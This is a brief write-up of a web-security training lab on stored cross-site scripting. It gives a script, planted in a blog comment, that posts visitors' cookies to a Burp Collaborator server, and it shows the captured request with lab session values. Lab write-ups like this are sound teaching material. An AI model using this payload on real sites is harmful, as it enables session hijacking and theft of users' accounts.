Exploiting cross-site scripting to steal cookies

Our first foray into Burp Collaborator! Exciting!

Click on a random post and pay attention to the comment area. You can run JS code in it. 
The lab simulates  a real person reading the blog, so you can store some JS code to steal their cookies.
You could roll out your own server for this, or just use Burp Collaborator. This essentially gives you an easy to deploy server for your engagements with great response collection.
The provided solution explains everything very well, but I'll post the script code here too just in case

<script>
fetch('https://4jon14g6a9qa6ynpf53n7wceq5wxkm.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script> 


Look in Collaborator for a POST request looking like this:

POST / HTTP/1.1
Host: gm6z4gjidltm9aq1ih6za8fqthz8nx.burpcollaborator.net
Connection: keep-alive
Content-Length: 81
Origin: https://ac9d1f5d1f01fa8180b4353800590095.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Referer: https://ac9d1f5d1f01fa8180b4353800590095.web-security-academy.net/post?postId=3
Accept-Encoding: gzip, deflate, br

secret=xRLBKHDnUNGDoRmzavdACtl3ndyw19LN; session=5GeFDDh0u0uozLiL4wDyFFWNEvPifj2T